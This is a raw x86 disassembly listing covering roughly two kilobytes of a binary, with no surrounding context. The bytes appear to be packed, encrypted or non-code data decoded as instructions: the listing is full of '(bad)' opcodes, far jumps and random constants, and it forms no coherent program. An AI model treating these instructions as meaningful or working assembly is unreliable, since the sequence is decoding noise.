  41819a:	mov    dh,BYTE PTR [ebx+eiz*8]
  41819d:	mov    bh,0x54
  41819f:	int3   
  4181a0:	test   dl,ah
  4181a2:	or     esi,0x106c6f3
  4181a8:	sub    eax,0x92ebb21b
  4181ad:	cmp    ch,BYTE PTR [ebx+0x2f]
  4181b0:	and    eax,0x7487d0db
  4181b5:	div    bh
  4181b7:	shr    DWORD PTR [esi+0x419bfbe4],cl
  4181bd:	mov    ch,0xca
  4181bf:	sub    DWORD PTR [edx+0xf],ebx
  4181c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181c3:	add    DWORD PTR [eax+0x1e],ebx
  4181c6:	sub    bh,0x58
  4181c9:	lods   al,BYTE PTR ds:[esi]
  4181ca:	and    esp,DWORD PTR [ecx]
  4181cc:	or     eax,0xa0175f8f
  4181d1:	cmp    bh,ch
  4181d3:	mov    dl,0xd1
  4181d5:	xor    ebp,0xca10bf54
  4181db:	stos   BYTE PTR es:[edi],al
  4181dc:	jmp    0xb52f:0xc4c75308
  4181e3:	in     al,0xeb
  4181e5:	xchg   edi,eax
  4181e6:	inc    ebp
  4181e7:	xor    BYTE PTR [eax-0x48],cl
  4181ea:	and    ah,BYTE PTR ds:0xc82f4bb7
  4181f0:	jmp    0xcae9:0xba242e5d
  4181f7:	fisttp DWORD PTR [esp+ebp*2-0x55a0ae87]
  4181fe:	pop    ss
  4181ff:	push   ss
  418200:	shl    BYTE PTR [esp+edx*8],cl
  418203:	adc    edi,ecx
  418205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418206:	xor    BYTE PTR ds:0xcf830afb,cl
  41820c:	xchg   ebx,eax
  41820d:	mov    esi,0x1548b86
  418212:	fbld   TBYTE PTR [edi*8-0x17997eec]
  418219:	das    
  41821a:	sub    ebp,esi
  41821c:	inc    esi
  41821d:	adc    al,0x34
  41821f:	mov    al,0x6e
  418221:	adc    bh,BYTE PTR [eax-0x2fa157a5]
  418227:	(bad)  
  418228:	xlat   BYTE PTR ds:[ebx]
  418229:	and    al,0x40
  41822b:	sahf   
  41822c:	or     ah,BYTE PTR [ebx]
  41822e:	inc    ecx
  41822f:	pop    ebp
  418230:	dec    esi
  418231:	sbb    cl,BYTE PTR [edx-0x2dfff19a]
  418237:	xor    eax,0x5982da3e
  41823c:	jp     0x4181e6
  41823e:	test   BYTE PTR cs:[ecx+0x72],bl
  418242:	jnp    0x4182ab
  418244:	outs   dx,DWORD PTR ds:[esi]
  418245:	arpl   WORD PTR [esi],si
  418247:	sub    dh,cl
  418249:	jmp    0x3546:0xf111a503
  418250:	push   esp
  418251:	ins    DWORD PTR es:[edi],dx
  418252:	xchg   edx,edi
  418254:	into   
  418255:	sub    al,BYTE PTR [edx]
  418257:	iret   
  418258:	push   eax
  418259:	dec    ebx
  41825a:	outs   dx,DWORD PTR ds:[esi]
  41825b:	mov    DWORD PTR [esi+0x27],ecx
  41825e:	inc    edx
  41825f:	stos   BYTE PTR es:[edi],al
  418260:	dec    edi
  418261:	mov    DWORD PTR [eax-0x58],edi
  418264:	and    dh,al
  418266:	pop    esi
  418267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418268:	mov    cl,0x4f
  41826a:	xor    DWORD PTR [edi],eax
  41826c:	adc    dh,BYTE PTR [ecx]
  41826e:	or     bl,cl
  418270:	add    BYTE PTR [esi+0x11],bl
  418273:	(bad)  
  418274:	(bad)  
  418275:	jmp    0x418207
  418277:	push   cs
  418278:	pop    es
  418279:	shl    DWORD PTR [edx+0x2f138dda],cl
  41827f:	mov    ebp,0x2bf5551d
  418284:	jg     0x41828b
  418286:	jl     0x41828c
  418288:	dec    ebp
  418289:	add    eax,0xdbed7f3d
  41828e:	mov    esi,0xba0364af
  418293:	push   es
  418294:	leave  
  418295:	das    
  418296:	dec    ebx
  418297:	xchg   BYTE PTR [eax+0xe],bl
  41829a:	and    ah,BYTE PTR [esi*2+0x22eac34d]
  4182a1:	xor    esi,ebx
  4182a3:	xor    ebp,DWORD PTR [ecx-0x4b]
  4182a6:	(bad)
  4182a9:	in     eax,0xe7
  4182ab:	mov    bh,0xa6
  4182ad:	cdq    
  4182ae:	jns    0x41832d
  4182b0:	sbb    al,0xcf
  4182b2:	pop    es
  4182b3:	inc    ecx
  4182b4:	cmp    bh,BYTE PTR [ebx]
  4182b6:	sbb    ebp,DWORD PTR ds:0x3a5a017c
  4182bc:	std    
  4182bd:	cmp    ebp,ecx
  4182bf:	add    dl,bl
  4182c1:	(bad)  
  4182c2:	std    
  4182c3:	jbe    0x4182cd
  4182c5:	adc    ah,BYTE PTR [esi+ecx*8-0x29]
  4182c9:	scas   eax,DWORD PTR es:[edi]
  4182ca:	stc    
  4182cb:	into   
  4182cc:	es inc esp
  4182ce:	aam    0x58
  4182d0:	adc    bh,BYTE PTR [ebp-0x48]
  4182d3:	pop    esi
  4182d4:	fisubr DWORD PTR [ebx+0x6a]
  4182d7:	mov    edi,0x19ac0791
  4182dc:	xchg   ebx,eax
  4182dd:	pop    ss
  4182de:	pop    es
  4182df:	jnp    0x4182f1
  4182e1:	in     al,0x6f
  4182e3:	ja     0x4182ab
  4182e5:	es jns 0x4182b9
  4182e8:	call   0xb0aaa090
  4182ed:	xlat   BYTE PTR ds:[ebx]
  4182ee:	mov    eax,ds:0x6c411619
  4182f3:	xor    al,0x6
  4182f5:	in     al,0xd5
  4182f7:	sti    
  4182f8:	mov    ds:0xdedef742,eax
  4182fd:	inc    ebx
  4182fe:	(bad)  
  4182ff:	cmc    
  418300:	ja     0x4182fc
  418302:	pop    eax
  418303:	lock mov BYTE PTR ds:0x214eb827,dh
  41830a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41830b:	pop    esp
  41830c:	sub    DWORD PTR [ecx],esp
  41830e:	aam    0x4c
  418310:	pusha  
  418311:	jbe    0x4182fb
  418313:	cmp    BYTE PTR [edx+0x2d],bl
  418316:	es mov edi,0x3c6fedae
  41831c:	mov    esi,0x2b739038
  418321:	and    eax,0xcafe22e9
  418326:	das    
  418327:	pop    ss
  418328:	mov    al,ds:0xdea863d9
  41832d:	stos   BYTE PTR es:[edi],al
  41832e:	dec    esp
  41832f:	test   al,0x98
  418331:	loop   0x41830f
  418333:	cmp    al,0xcf
  418335:	jle    0x4182bc
  418337:	mov    ds:0x6870c08f,eax
  41833c:	or     edi,ecx
  41833e:	add    dh,BYTE PTR [esi]
  418340:	bound  edi,QWORD PTR [edi-0xc26934d]
  418346:	mov    esp,0xc4039528
  41834b:	push   0x3c
  41834d:	call   0xd771:0xa23ccf34
  418354:	xchg   DWORD PTR [edx-0x605faa60],esp
  41835a:	les    esp,FWORD PTR [ecx]
  41835c:	mov    BYTE PTR [bx+0x4a3c],dl
  418361:	dec    eax
  418362:	mov    edx,0x5aee8b86
  418367:	ds daa 
  418369:	jnp    0x41837a
  41836b:	jge    0x41836f
  41836d:	dec    esp
  41836e:	xchg   esp,eax
  41836f:	dec    edx
  418370:	imul   esi,DWORD PTR [esi-0x77],0xffffff9f
  418374:	jl     0x418300
  418376:	sub    eax,0xb0dc5abd
  41837b:	sbb    eax,0x620a3976
  418380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418381:	call   0xf205:0xe635fe19
  418388:	mov    cl,0xf3
  41838a:	(bad)  
  41838b:	cmc    
  41838c:	dec    esp
  41838d:	push   ecx
  41838e:	repz clc 
  418390:	lds    ebx,FWORD PTR [eax*2+0x49fb41d4]
  418397:	sbb    esi,ebx
  418399:	push   ecx
  41839a:	neg    ch
  41839c:	mov    bl,0xd2
  41839e:	pusha  
  41839f:	cmp    BYTE PTR [eax-0x639eabcc],dl
  4183a5:	add    eax,0x64c6e6ee
  4183aa:	call   0xc0cd6141
  4183af:	jle    0x41839f
  4183b1:	push   edi
  4183b2:	(bad)  
  4183b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183b4:	ja     0x418431
  4183b6:	repz loop 0x4183ad
  4183b9:	dec    eax
  4183ba:	repnz mov dl,0x17
  4183bd:	jge    0x4183a0
  4183bf:	push   ss
  4183c0:	cmp    dl,BYTE PTR [ebx-0x1fbf5a7f]
  4183c6:	jge    0x4183a7
  4183c8:	or     dl,dh
  4183ca:	pusha  
  4183cb:	enter  0xed4a,0x72
  4183cf:	cld    
  4183d0:	clc    
  4183d1:	push   esi
  4183d2:	push   esi
  4183d3:	rcr    BYTE PTR [ebp+edx*2-0x2cc0fe74],1
  4183da:	aad    0xde
  4183dc:	push   eax
  4183dd:	stos   BYTE PTR es:[edi],al
  4183de:	inc    edi
  4183df:	retf   
  4183e0:	or     ebx,ebx
  4183e2:	mov    BYTE PTR [ecx-0x63],ch
  4183e5:	fmul   st,st(2)
  4183e7:	imul   dh
  4183e9:	xor    ebx,DWORD PTR [ebx-0x4f]
  4183ec:	aad    0x7b
  4183ee:	jnp    0x4183f7
  4183f0:	mov    esi,0xf54fde7c
  4183f5:	sbb    dh,BYTE PTR [edx]
  4183f7:	cmp    BYTE PTR [edx],al
  4183f9:	lock push ecx
  4183fb:	jmp    0xebb7b382
  418400:	(bad)  
  418401:	outs   dx,DWORD PTR ds:[esi]
  418402:	clc    
  418403:	shl    DWORD PTR [edi-0x5488a482],1
  418409:	sahf   
  41840a:	xor    DWORD PTR [ecx],ebx
  41840c:	ret    0x2235
  41840f:	fwait
  418410:	push   cs
  418411:	popf   
  418412:	retf   
  418413:	xchg   dl,bh
  418415:	fimul  DWORD PTR [ecx]
  418417:	cmp    esi,eax
  418419:	or     al,0xab
  41841b:	pop    ss
  41841c:	add    al,0x4f
  41841e:	shr    BYTE PTR [edx+0x67885411],1
  418424:	push   0xb22753b
  418429:	sub    BYTE PTR [ecx-0x1931bf7],ah
  41842f:	cmp    BYTE PTR [edx],ah
  418431:	fld    DWORD PTR [edi]
  418433:	jle    0x4183ea
  418435:	xchg   edx,eax
  418436:	rol    BYTE PTR [edi+0x1b3b0e64],1
  41843c:	and    esi,DWORD PTR [ecx+0x15]
  41843f:	aaa    
  418440:	xchg   edx,eax
  418441:	sar    ah,1
  418443:	mov    edx,0x47a94e6
  418448:	adc    al,0x72
  41844a:	inc    edi
  41844b:	push   edx
  41844c:	xor    al,0xaf
  41844e:	mov    cl,0xd8
  418450:	and    BYTE PTR [edx-0x4f727b15],ch
  418456:	ins    DWORD PTR es:[edi],dx
  418457:	rcr    BYTE PTR [edi-0x69b02cf],1
  41845d:	imul   edi,DWORD PTR [esi-0x19245923],0xe860afc
  418467:	fmul   QWORD PTR [ebx+0x3e]
  41846a:	inc    ecx
  41846b:	mov    edi,0xe6b9d23a
  418470:	adc    BYTE PTR [edi-0x52],dl
  418473:	clc    
  418474:	jbe    0x4184a3
  418476:	pop    eax
  418477:	push   edi
  418478:	in     eax,0x4f
  41847a:	mov    esp,0xb91fad10
  41847f:	in     eax,0x5b
  418481:	adc    BYTE PTR [esi+0x4d883e12],0x5f
  418488:	mov    WORD PTR [ebp-0xb],cs
  41848b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41848c:	in     al,dx
  41848d:	inc    BYTE PTR [edx+0x2615f399]
  418493:	vunpcklpd ymm4,ymm1,YMMWORD PTR [ebp-0x7dfc4ef8]
  41849b:	sub    ebp,DWORD PTR [edi+0x44]
  41849e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41849f:	dec    esi
  4184a0:	adc    al,0x6
  4184a2:	(bad)  
  4184a4:	rol    BYTE PTR [ecx],1
  4184a6:	pop    ebx
  4184a7:	shl    DWORD PTR [ebx+0x5f],0x4
  4184ab:	mov    ds:0x1429ec9e,eax
  4184b0:	xchg   esp,eax
  4184b1:	mov    edx,0x94e923e4
  4184b6:	push   eax
  4184b7:	jno    0x4184ec
  4184b9:	add    dh,ah
  4184bb:	test   eax,0xa456e974
  4184c0:	(bad)  
  4184c1:	out    dx,al
  4184c2:	retf   
  4184c3:	sub    dh,BYTE PTR [edi-0x6c8e81d9]
  4184c9:	ins    DWORD PTR es:[edi],dx
  4184ca:	ins    BYTE PTR es:[edi],dx
  4184cb:	mov    DWORD PTR [ecx+edi*4+0x3c],ebx
  4184cf:	in     al,0x13
  4184d1:	push   0x66
  4184d3:	(bad)  
  4184d5:	out    dx,eax
  4184d6:	add    BYTE PTR [edx*4-0x40def9ba],ch
  4184dd:	mov    esi,0x92b78b2a
  4184e2:	add    al,0x39
  4184e4:	xor    DWORD PTR ds:0x5363d12c,ecx
  4184ea:	mov    DWORD PTR [ecx],0xd75ef43d
  4184f0:	jo     0x418532
  4184f2:	and    esp,DWORD PTR [ecx-0x41]
  4184f5:	push   cs
  4184f6:	xchg   ecx,eax
  4184f7:	jae    0x4184c7
  4184f9:	mov    gs,edi
  4184fb:	aam    0x88
  4184fd:	pop    edi
  4184fe:	or     ebx,DWORD PTR [eax-0x43fdf16b]
  418504:	push   cs
  418505:	jle    0x418507
  418507:	ret    
  418508:	cs or  eax,0x805a9992
  41850e:	int3   
  41850f:	mov    es,ebx
  418511:	or     BYTE PTR [ebx+0x27594937],cl
  418517:	xor    al,0x4c
  418519:	xor    al,0xf6
  41851b:	xor    eax,0x495dcb81
  418520:	push   ebx
  418521:	popf   
  418522:	fist   WORD PTR [esi-0x2a]
  418525:	jne    0x4184b7
  418527:	fbstp  TBYTE PTR [eax+edi*4-0x6c]
  41852b:	dec    edx
  41852c:	mov    esi,0xb4b619e
  418531:	shl    eax,1
  418533:	frstor [ebp-0x11]
  418536:	adc    bh,BYTE PTR [ebx-0x6370952]
  41853c:	rol    BYTE PTR [esi-0x14a72ce4],cl
  418542:	jo     0x41859c
  418544:	retf   0x118e
  418547:	pusha  
  418548:	mov    esi,0xb1963915
  41854d:	push   DWORD PTR [eax]
  41854f:	(bad)  
  418550:	out    0x42,al
  418552:	and    DWORD PTR [eax-0x3f],0xffffffdf
  418556:	int    0x9e
  418558:	dec    edi
  418559:	pop    ebx
  41855a:	sub    esi,DWORD PTR [ebx-0x6d]
  41855d:	jl     0x4185b3
  41855f:	mov    DWORD PTR [ebx+0x53],esi
  418562:	jge    0x41850a
  418564:	lock (bad) 
  418566:	imul   DWORD PTR [eax+0x6e7be9c]
  41856c:	mov    ecx,0xaadd4ffd
  418571:	test   cl,al
  418573:	jmp    0xd83b:0x5cbb3ed2
  41857a:	shl    bl,0x1f
  41857d:	xchg   esi,eax
  41857e:	push   edi
  41857f:	sti    
  418580:	fiadd  WORD PTR [esp+edi*1+0x3a13d7b9]
  418587:	shl    BYTE PTR [edx+edx*4-0x6ea0d968],cl
  41858e:	and    ebp,esi
  418590:	pop    ds
  418591:	and    cl,BYTE PTR [edi+esi*4]
  418594:	sbb    ch,BYTE PTR [eax-0x34ede65f]
  41859a:	mov    ds:0x82d8211d,eax
  41859f:	mov    edi,0x61cc0d7c
  4185a4:	inc    ebx
  4185a5:	clc    
  4185a6:	jmp    0xe6d1:0xa7a38ef
  4185ad:	dec    ebp
  4185ae:	mov    ch,0x8e
  4185b0:	inc    eax
  4185b1:	daa    
  4185b2:	push   eax
  4185b3:	das    
  4185b4:	mov    ebx,0x80ad9dd9
  4185b9:	and    eax,DWORD PTR [edx+0x1b54ce46]
  4185bf:	loope  0x418620
  4185c1:	mov    WORD PTR [ebx],cs
  4185c3:	sahf   
  4185c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185c5:	add    bh,BYTE PTR [edx+0x77]
  4185c8:	or     bh,BYTE PTR [eax]
  4185ca:	jp     0x418566
  4185cc:	into   
  4185cd:	cdq    
  4185ce:	xchg   edx,eax
  4185cf:	fwait
  4185d0:	xor    eax,0xf13aa784
  4185d5:	jge    0x418609
  4185d7:	jle    0x41855d
  4185d9:	inc    ebp
  4185da:	cwde   
  4185db:	jne    0x41857e
  4185dd:	cmp    eax,0x544c6361
  4185e2:	call   0x5ddc:0xac9bbea6
  4185e9:	adc    al,0x79
  4185eb:	or     DWORD PTR [eax],edi
  4185ed:	jle    0x41862e
  4185ef:	cs callw 0xb0fd
  4185f4:	pop    edx
  4185f5:	icebp  
  4185f6:	lods   al,BYTE PTR ds:[esi]
  4185f7:	xor    eax,0xb24e0de8
  4185fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185fd:	cmp    esi,0x72
  418600:	pop    ss
  418601:	imul   DWORD PTR [eax-0x3b707d92]
  418607:	repnz inc ecx
  418609:	adc    DWORD PTR [eax-0x64],edi
  41860c:	push   edi
  41860d:	dec    edi
  41860e:	xchg   ebp,eax
  41860f:	cmp    eax,0xa271711a
  418614:	mov    edi,0xac3ac933
  418619:	or     dh,BYTE PTR [ebp-0x2a]
  41861c:	in     al,dx
  41861d:	(bad)  
  41861f:	jbe    0x41868b
  418621:	mov    ah,0xc4
  418623:	inc    ecx
  418624:	iret   
  418625:	mov    es,WORD PTR [edi]
  418627:	stc    
  418628:	add    ebp,DWORD PTR [ebx+0x38cf9a6b]
  41862e:	dec    ebx
  41862f:	add    dl,BYTE PTR [esi]
  418631:	test   DWORD PTR [edi+eiz*2-0x4be85b8f],esi
  418638:	lods   eax,DWORD PTR ds:[esi]
  418639:	mov    WORD PTR [esp+edi*2+0x7ef79d79],cs
  418640:	xchg   ecx,eax
  418641:	out    dx,eax
  418642:	sbb    eax,ecx
  418644:	sub    ah,BYTE PTR [ebx+0x2f4ff06b]
  41864a:	mov    esp,DWORD PTR [ebp+ebp*4-0x27ed9e0c]
  418651:	pop    ebx
  418652:	enter  0x89b7,0x1e
  418656:	or     ebp,DWORD PTR [esi+0x5e6a0371]
  41865c:	sub    eax,0x4d23b02c
  418661:	test   DWORD PTR [edi],esi
  418663:	cmp    eax,0x3f65f554
  418668:	mov    dh,BYTE PTR [eax+edx*8-0x59]
  41866c:	xchg   esp,eax
  41866d:	es pop ebx
  41866f:	mov    esp,eax
  418671:	std    
  418672:	ja     0x4186ec
  418674:	cs ds scas eax,DWORD PTR es:[edi]
  418677:	add    eax,0x2447e9d2
  41867c:	or     BYTE PTR [edx+0xcc68b5c],bl
  418682:	push   ds
  418683:	je     0x418691
  418685:	mov    al,ds:0x1c12f522
  41868a:	fcmovb st,st(7)
  41868c:	ds mov ah,0x6b
  41868f:	mov    ebx,0x20e0f5ca
  418694:	(bad)  
  418695:	loop   0x41869d
  418697:	push   0x62
  418699:	retf   
  41869a:	pop    ebx
  41869b:	fnstsw ax
  41869d:	jnp    0x4186c3
  41869f:	adc    ebp,DWORD PTR [edi]
  4186a1:	pushf  
  4186a2:	cli    
  4186a3:	js     0x4186c7
  4186a5:	cwde   
  4186a6:	dec    eax
  4186a7:	dec    ecx
  4186a8:	aaa    
  4186a9:	jae    0x418651
  4186ab:	push   ds
  4186ac:	inc    edx
  4186ad:	out    0xbe,eax
  4186af:	es lahf 
  4186b1:	or     eax,0x6245ddc1
  4186b6:	cwde   
  4186b7:	pop    ecx
  4186b8:	test   DWORD PTR [ebx+edi*4+0x546d4373],0xc98f6ed1
  4186c3:	(bad)  
  4186c4:	retf   
  4186c5:	mov    esi,0x53fab19
  4186ca:	fs pushf 
  4186cc:	jg     0x4186fb
  4186ce:	mov    dl,0x7b
  4186d0:	adc    eax,0x3f8a0c85
  4186d5:	not    DWORD PTR [esi+0x2076a2d]
  4186db:	xchg   edx,eax
  4186dc:	pop    ss
  4186dd:	mov    al,ds:0xf49cb44b
  4186e2:	cld    
  4186e3:	ins    DWORD PTR es:[edi],dx
  4186e4:	xchg   ebx,eax
  4186e5:	xor    BYTE PTR [ebp+0x76190568],al
  4186eb:	ret    0xdf0d
  4186ee:	mov    ebp,0x8b1bcd76
  4186f3:	ins    DWORD PTR es:[edi],dx
  4186f4:	aam    0x7
  4186f6:	mov    ah,BYTE PTR [edi+0x29]
  4186f9:	adc    al,0xab
  4186fb:	push   cs
  4186fc:	push   0xe6d61d9
  418701:	mov    ds:0x31ecc7e1,eax
  418706:	cs std 
  418708:	or     esi,ebx
  41870a:	retf   
  41870b:	add    BYTE PTR [esi],al
  41870d:	mov    al,ds:0x8257ca0c
  418712:	ins    DWORD PTR es:[edi],dx
  418713:	jmp    0xee91:0x49148b03
  41871a:	daa    
  41871b:	jl     0x4186e8
  41871d:	xchg   ebx,eax
  41871e:	mov    bl,0x5e
  418720:	inc    esp
  418721:	dec    ebp
  418722:	xchg   ecx,eax
  418723:	mov    ebx,0x5db66f65
  418728:	icebp  
  418729:	xchg   ebx,eax
  41872a:	push   esp
  41872b:	fsubr  DWORD PTR [edi+0x32]
  41872e:	and    al,0x39
  418730:	xor    dh,BYTE PTR [esi]
  418732:	cwde   
  418733:	out    0xed,eax
  418735:	sub    ch,BYTE PTR [eax-0xe]
  418738:	out    0xb,al
  41873a:	fnstcw WORD PTR [ebp+0x22]
  41873d:	mov    bl,0xa
  41873f:	outs   dx,DWORD PTR ds:[esi]
  418740:	mov    al,0x9d
  418742:	xchg   ebx,eax
  418743:	mov    eax,0xf6a5f866
  418748:	add    ah,dl
  41874a:	mov    BYTE PTR [ebx],0xaf
  41874d:	push   esi
  41874e:	and    DWORD PTR [ecx-0x4c67aeb3],esi
  418754:	push   ebp
  418755:	cmc    
  418756:	in     eax,dx
  418757:	and    al,0xc4
  418759:	cmp    BYTE PTR [edi-0x43b24024],cl
  41875f:	or     edi,DWORD PTR [edi-0x7a7d2727]
  418765:	test   DWORD PTR [ebx],ebp
  418767:	shl    DWORD PTR [edx],1
  418769:	mov    ecx,0x61392886
  41876e:	adc    al,0xa2
  418770:	sbb    al,0x15
  418772:	stos   DWORD PTR es:[edi],eax
  418773:	push   esi
  418774:	sub    eax,0x738f4910
  418779:	xor    DWORD PTR [edi+0x25ca0595],ecx
  41877f:	mov    ch,0x3c
  418781:	and    eax,0x84f89cd4
  418786:	mov    esp,DWORD PTR [edx]
  418788:	sbb    al,0xda
  41878a:	fs mov dl,0x0
  41878d:	mov    dl,0x83
  41878f:	fcmovne st,st(7)
  418791:	add    esi,DWORD PTR [esp+esi*8-0x5c]
  418795:	adc    eax,0x6979f55f
  41879a:	cdq    
  41879b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41879c:	in     eax,dx
  41879d:	jo     0x41876a
  41879f:	add    ebp,ebp
  4187a1:	in     al,0xa4
  4187a3:	dec    eax
  4187a4:	add    ebx,DWORD PTR [ecx-0x73]
  4187a7:	mov    ds:0x9a8ad697,al
  4187ac:	push   ds
  4187ad:	(bad)  [edx]
  4187af:	add    ch,BYTE PTR [edi+0x6f]
  4187b2:	test   DWORD PTR [ecx+eiz*4+0x6b62577c],esi
  4187b9:	inc    esp
  4187ba:	stos   BYTE PTR es:[edi],al
  4187bb:	(bad)  
  4187bc:	jmp    0xc440d540
  4187c1:	xchg   edi,eax
  4187c2:	fidiv  DWORD PTR [ebp-0x35]
  4187c5:	pop    eax
  4187c6:	inc    ebp
  4187c7:	dec    ecx
  4187c8:	jnp    0x418786
  4187ca:	mov    ecx,DWORD PTR [eax-0x40]
  4187cd:	xor    cl,bh
  4187cf:	cmp    BYTE PTR [edi],0xb7
  4187d2:	ret    0x88fc
  4187d5:	pop    ecx
  4187d6:	pop    edi
  4187d7:	sbb    al,0x58
  4187d9:	inc    edx
  4187da:	jns    0x4187b6
  4187dc:	mov    dl,0x56
  4187de:	movd   DWORD PTR [edi-0x41],mm4
  4187e2:	not    dl
  4187e4:	push   edx
  4187e5:	sti    
  4187e6:	dec    esp
  4187e7:	cmp    eax,esp
  4187e9:	dec    eax
  4187ea:	jmp    0x4187bf
  4187ec:	jg     0x41877c
  4187ee:	fisubr WORD PTR [esi-0x5c34240e]
  4187f4:	sub    BYTE PTR [edx-0x7fc5f6c9],dh
  4187fa:	xlat   BYTE PTR ds:[ebx]
  4187fb:	pop    ss
  4187fc:	add    eax,0xfc5ec213
  418801:	pop    esp
  418802:	iret   
  418803:	mov    cl,0xa3
  418805:	pop    ebp
  418806:	adc    eax,DWORD PTR [eax+0x17]
  418809:	or     BYTE PTR [ecx-0x378bcf95],ch
  41880f:	push   edi
  418810:	mov    ah,BYTE PTR [esi+0x1483c178]
  418816:	adc    BYTE PTR [esi+0x7d],dh
  418819:	in     al,0x1b
  41881b:	mov    bh,BYTE PTR [ebp-0x2a]
  41881e:	pushf  
  41881f:	clc    
  418820:	call   0x2ef0:0xed7ba25b
  418827:	data16 add cl,BYTE PTR [edx+eax*4-0x7b4326aa]
  41882f:	jmp    0x11159cf3
  418834:	aaa    
  418835:	xlat   BYTE PTR ds:[ebx]
  418836:	xchg   ebp,eax
  418837:	mov    gs,WORD PTR [ebp+0x44]
  41883a:	push   ds
  41883b:	(bad)  
  41883c:	fnstenv [esi]
  41883e:	mov    ds:0x5510a8ee,al
  418843:	jmp    0x5076:0x1cc570ba
  41884a:	int    0xb1
  41884c:	mov    ?,WORD PTR [edx]
  41884e:	cmp    eax,0xf3bc5d03
  418853:	nop
  418854:	stc    
  418855:	mov    eax,eax
  418857:	mov    esi,0x1a462b9
  41885c:	jge    0x4187e0
  41885e:	js     0x4188a6
  418860:	into   
  418861:	dec    esp
  418862:	jne    0x4188be
  418864:	jmp    0x8eb12351
  418869:	bound  esp,QWORD PTR [edi+0xb9edbcc]
  41886f:	sbb    DWORD PTR [ebp+eiz*2-0x54403091],esp
  418876:	aad    0xac
  418878:	pop    ss
  418879:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41887a:	sti    
  41887b:	and    esp,esp
  41887d:	arpl   WORD PTR [edi+0x1c91fdc6],bx
  418883:	adc    al,BYTE PTR [ecx]
  418885:	imul   esp,DWORD PTR [edi],0x10
  418888:	mov    ebp,0x2caf368a
  41888d:	cli    
  41888e:	shr    edi,1
  418890:	sbb    ebp,DWORD PTR [ecx+esi*1-0x27]
  418894:	sbb    DWORD PTR [edi-0x57ddad04],edi
  41889a:	cmp    BYTE PTR [ebx+0x6ee178bc],dl
  4188a0:	or     eax,0xc4884977
  4188a5:	sub    eax,0x35f921af
  4188aa:	pop    ds
  4188ab:	scas   al,BYTE PTR es:[edi]
  4188ac:	push   edi
  4188ad:	ror    ah,0xe3
  4188b0:	ins    BYTE PTR es:[edi],dx
  4188b1:	hlt    
  4188b2:	pop    edx
  4188b3:	cmp    dh,BYTE PTR [edi]
  4188b5:	mov    al,0xba
  4188b7:	mov    al,fs:0xfdcea5cb
  4188bd:	arpl   WORD PTR [ebp+0x1bd853bd],cx
  4188c3:	jl     0x418864
  4188c5:	mov    edx,0x478813fb
  4188ca:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4188cc:	cli    
  4188cd:	mov    esi,0xc7799ffb
  4188d2:	push   ebp
  4188d3:	pop    esi
  4188d4:	inc    esi
  4188d5:	scas   al,BYTE PTR es:[edi]
  4188d6:	int    0x24
  4188d8:	push   cs
  4188d9:	jae    0x418905
  4188db:	jge    0x41885f
  4188dd:	jmp    0x427:0x31d4f70
  4188e4:	push   ebx
  4188e5:	adc    ah,dh
  4188e7:	mov    ds:0xa0775d55,eax
  4188ec:	retf   
  4188ed:	adc    ch,cl
  4188ef:	sti    
  4188f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188f1:	adc    BYTE PTR [eax+edi*4],cl
  4188f4:	jb     0x41888f
  4188f6:	out    dx,eax
  4188f7:	cmp    ah,0x0
  4188fa:	push   esp
  4188fb:	ins    BYTE PTR es:[edi],dx
  4188fc:	pop    ebp
  4188fd:	add    DWORD PTR [ebp-0x1b],0xffffff9b
  418901:	push   edx
  418902:	outs   dx,DWORD PTR ds:[esi]
  418903:	call   0x4895:0x95b32586
  41890a:	pop    esp
  41890b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890c:	aam    0x49
  41890e:	dec    esi
  41890f:	lock or DWORD PTR [eax-0x2bdb4f67],esp
  418916:	adc    BYTE PTR [edx+0x304650d4],dl
  41891c:	stc    
  41891d:	jns    0x4188b8
  41891f:	jge    0x4188db
  418921:	sbb    al,0x50
  418923:	fs pushf 
  418925:	les    eax,FWORD PTR [esp+ebp*8]
  418928:	pop    ebx
  418929:	sub    cl,BYTE PTR [ebx]
  41892b:	retf   0xa75e
  41892e:	xor    al,0x36
  418930:	mov    dh,0xe4
  418932:	adc    esi,DWORD PTR [edx]
  418934:	cmp    BYTE PTR [ecx+0x4e6a94c],cl
  41893a:	sti    
  41893b:	mov    edx,gs
  41893d:	fld    TBYTE PTR [eax+0x50]
  418940:	dec    edx
  418941:	jb     0x4188f5
  418943:	scas   eax,DWORD PTR es:[edi]
  418944:	pop    eax
  418945:	lea    eax,[ecx+eiz*1]
  418948:	lods   al,BYTE PTR ds:[esi]
  418949:	mov    dh,0xd0
  41894b:	fistp  DWORD PTR [ebx+0x4bc08f4d]
  418951:	cwde   
  418952:	push   0xffffff87
  418954:	aam    0xb
  418956:	ja     0x418942
  418958:	aas    
  418959:	or     eax,0xe0ce14ad
  41895e:	fiadd  WORD PTR [edx]
  418960:	jae    0x4189a1
  418962:	mov    dh,0x71
  418964:	or     eax,0x26ce332c
  418969:	xor    DWORD PTR [ebx+0x418e6bf7],0xdf89f8ad
  418973:	sub    al,0x6b
  418975:	sar    DWORD PTR [ebx-0x314e7032],cl
  41897b:	outs   dx,BYTE PTR ds:[esi]
  41897c:	fwait
  41897d:	mov    ah,0xf
  41897f:	and    bh,BYTE PTR [ecx+0xd41e380]
  418985:	adc    ah,BYTE PTR cs:[esi+0x5]
  418989:	imul   edi,DWORD PTR [esi+0x29e55ec6],0xf24f1d5b
  418993:	jnp    0x4189a0
  418995:	mov    bh,0x72
  418997:	iret   
  418998:	rcl    BYTE PTR [esi],1
  41899a:	add    ah,BYTE PTR [ecx+0x7c]
  41899d:	jno    0x4189dd
  41899f:	mov    cl,0x61
  4189a1:	retf   0x8ca
